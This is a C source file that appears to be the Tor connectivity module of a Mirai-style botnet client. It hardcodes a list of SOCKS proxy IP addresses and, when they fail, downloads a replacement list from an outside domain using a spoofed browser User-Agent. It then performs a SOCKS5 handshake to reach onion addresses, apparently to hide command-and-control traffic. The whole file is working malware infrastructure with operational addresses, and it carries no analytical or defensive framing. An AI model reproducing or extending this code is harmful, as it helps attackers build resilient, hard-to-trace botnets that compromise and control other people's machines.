#include "headers/includes.h"
#include "headers/tor.h"
#include "headers/rand.h"
#include "headers/cnc_protocol.h"

static struct tor_proxy proxies[TOR_MAX_SOCKS];
static int proxies_len = 0;

void tor_init(void) {
    int i = 0;
    proxies[i++] = (struct tor_proxy){inet_addr("51.159.152.86"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("64.227.167.96"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("139.59.44.192"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("209.182.219.242"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("132.145.110.217"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("92.42.96.223"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("188.40.164.205"), htons(9050), 1};
    proxies_len = i;
}

static void tor_fetch_fresh_proxies(void) {
    PRINTF("[tor] All proxies failed. Fetching fresh list from dcasdcas.online...\n");


    int fd;
    struct sockaddr_in addr;
    char buffer[4096];

    struct hostent *he = gethostbyname("dcasdcas.online");
    if (he == NULL || he->h_addr_list[0] == NULL) {
        PRINTF("[tor] Failed to resolve dcasdcas.online\n");

        return;
    }

    addr.sin_addr.s_addr = *(uint32_t *)he->h_addr_list[0];

    if ((fd = (int)socket(AF_INET, SOCK_STREAM, 0)) == -1) return;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    util_zero(addr.sin_zero, 8);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) == -1) {
        close(fd);
        return;
    }

    char *req = "GET /tortumama.txt HTTP/1.1\r\n"
                "Host: dcasdcas.online\r\n"
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
                "Connection: close\r\n\r\n";

    send(fd, req, util_strlen(req), 0);

    int total_read = 0;
    while(total_read < sizeof(buffer) - 1) {
        int r = recv(fd, buffer + total_read, sizeof(buffer) - 1 - total_read, 0);
        if (r <= 0) break;
        total_read += r;
    }
    buffer[total_read] = 0;
    close(fd);

    if (total_read > 0) {
        int count = 0;
        char *ptr = buffer;
        char *body = util_strstr(buffer, "\r\n\r\n");
        if (body) ptr = body + 4;

        char *line = util_strtok(ptr, "\n");
        while (line != NULL && count < TOR_MAX_SOCKS) {
            char *colon = util_strchr(line, ':');
            if (colon) {
                *colon = 0;
                char *ip_str = line;
                char *port_str = colon + 1;
                if (util_strlen(ip_str) > 6 && util_strlen(port_str) > 0) {
                     proxies[count].ip = inet_addr(ip_str);
                     proxies[count].port = htons((uint16_t)util_atoi(port_str));
                     proxies[count].working = 1;
                     count++;
                }
            }
            line = util_strtok(NULL, "\n");
        }
        if (count > 0) proxies_len = count;
    }
}

static int full_recv(int fd, char *buf, int len) {
    int total = 0;
    while (total < len) {
        int r = recv(fd, buf + total, len - total, 0);
        if (r <= 0) return -1;
        total += r;
    }
    return total;
}

int tor_socks5_handshake(int fd, const char *onion_addr, uint16_t port) {
    uint8_t buf[512];

    PRINTF("[tor] Starting SOCKS5 handshake for %s:%d\n", onion_addr, port);

    buf[0] = 0x05; buf[1] = 0x01; buf[2] = 0x00;
    if (send(fd, (char *)buf, 3, 0) != 3) { PRINTF("[tor] Auth send failed\n"); return -1; }
    if (full_recv(fd, (char *)buf, 2) != 2) { PRINTF("[tor] Auth recv failed\n"); return -1; }
    if (buf[1] != 0x00) { PRINTF("[tor] Auth method not accepted: %02x\n", buf[1]); return -1; }
    PRINTF("[tor] SOCKS5 Auth OK\n");

    uint8_t onion_len = (uint8_t)util_strlen(onion_addr);
    buf[0] = 0x05; buf[1] = 0x01; buf[2] = 0x00; buf[3] = 0x03;
    buf[4] = onion_len;
    util_memcpy(buf + 5, onion_addr, onion_len);
    uint16_t net_port = htons(port);
    util_memcpy(buf + 5 + onion_len, &net_port, 2);

    PRINTF("[tor] Sending connect request...\n");
    if (send(fd, (char *)buf, 7 + onion_len, 0) != (7 + onion_len)) { PRINTF("[tor] Connect send failed\n"); return -1; }

    if (full_recv(fd, (char *)buf, 4) != 4) { PRINTF("[tor] Connect response head recv failed\n"); return -1; }
    if (buf[1] != 0x00) { PRINTF("[tor] Connect failed, SOCKS error: %02x\n", buf[1]); return -1; }
    PRINTF("[tor] SOCKS5 Connect OK\n");

    int addr_len = 0;
    if (buf[3] == 0x01) addr_len = 4 + 2;
    else if (buf[3] == 0x03) {
        if (full_recv(fd, (char *)&addr_len, 1) != 1) { PRINTF("[tor] Addr len recv failed\n"); return -1; }
        addr_len += 2;
    }
    else if (buf[3] == 0x04) addr_len = 16 + 2;

    if (addr_len > 0) {
        char garbage[256];
        if (full_recv(fd, garbage, addr_len) != addr_len) { PRINTF("[tor] Garbage recv failed\n"); return -1; }
    }

    PRINTF("[tor] Handshake complete\n");
    return 0;
}

struct tor_proxy *tor_get_random(void) {
    if (proxies_len == 0) return NULL;
    return &proxies[rand_next() % proxies_len];
}

void tor_report_working(struct tor_proxy *proxy, int is_working) {
    if (proxy != NULL) proxy->working = is_working;
}
